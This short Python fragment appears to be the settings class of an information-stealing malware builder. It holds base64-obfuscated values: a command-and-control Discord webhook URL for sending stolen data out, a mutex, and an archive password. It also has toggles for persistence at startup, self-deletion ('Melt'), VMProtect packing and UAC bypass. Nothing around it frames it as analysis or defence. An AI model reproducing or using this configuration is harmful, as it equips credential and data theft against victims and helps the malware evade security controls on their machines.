...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE3MDkwMDE2NzYwNDU4MDM4Mi9KZEtBeDZVaWJhaWxaSjAwVDk0TjVjZUlEQ2JsWFRFamhrZ2tBTGJSd2FNbXE3d3FQcmtiRWtuWlFqYTR2UzBUOVVxQQ==').decode())
    Mutex = base64.b64decode('cmRna0s2bTRMcTZubkZDNA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('bWF0dGlkZXY=').decode()
